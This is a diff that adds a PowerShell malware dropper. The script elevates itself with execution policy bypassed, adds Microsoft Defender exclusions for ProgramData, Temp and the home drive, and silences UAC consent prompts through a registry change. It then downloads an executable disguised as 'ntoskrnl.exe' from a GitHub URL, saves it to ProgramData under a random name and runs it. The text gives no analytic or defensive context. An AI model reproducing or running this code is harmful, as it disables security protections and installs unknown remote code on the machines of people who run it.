@@ -1,0 +1,19 @@
+$A = "Start"
+$B = "powershell"
+$C = "-ExecutionPolicy Bypass"
+$D = "Add-MpPreference -ExclusionPath '$Env:ProgramData, $Env:Temp, $Env:HomeDrive;'"
+$E = 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWORD'
+$F = $C + " " + $D + " " + $E
+
+Start-Process $B -ArgumentList $F -Verb "RunAs"
+
+$G = "https://github.com/MYRALL/fixx/raw/refs/heads/master/ntoskrnl.exe"
+
+$I = Join-Path $Env:ProgramData ("j3owB" + '.exe')
+
+Invoke-WebRequest -Uri $G -OutFile $I
+
+Start-Process $I
+
+$Items = @()
+$Items += $I
